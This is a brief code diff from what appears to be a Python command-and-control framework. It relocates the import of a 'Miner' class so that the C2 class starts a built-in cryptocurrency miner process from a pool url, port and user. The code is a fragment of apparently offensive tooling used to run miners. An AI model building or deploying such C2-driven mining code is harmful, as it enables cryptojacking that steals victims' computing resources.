@@ -30,7 +30,6 @@ if sys.version_info[0] > 2:
 import core.util as util
 import core.database as database
 import core.security as security
-from core.miner import Miner
 
 # packages
 try:
@@ -462,7 +461,7 @@ class C2():
 
         # first attempt using built-in python miner
         try:
-            import pycryptonight, pyrx
+            from core.miner import Miner
             self.child_procs['dev_miner_py'] = Miner(url=url, port=host_port, user=user)
             self.child_procs['dev_miner_py'].start()
         except Exception as e:
